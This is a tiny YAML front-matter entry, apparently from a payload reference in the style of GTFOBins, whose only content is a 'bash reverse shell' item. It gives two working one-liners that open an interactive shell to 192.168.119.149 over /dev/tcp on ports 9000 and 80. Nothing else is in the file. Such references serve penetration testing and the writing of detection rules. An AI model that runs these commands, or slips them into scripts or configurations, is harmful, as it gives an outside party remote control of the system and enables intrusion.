---
functions:
  shell:
    - description: bash reverse shell
      code: |
        /bin/bash -i >& /dev/tcp/192.168.119.149/9000 0>&1
        
        0<&107-;exec 107<>/dev/tcp/192.168.119.149/80;sh <&107 >&107 2>&107
---
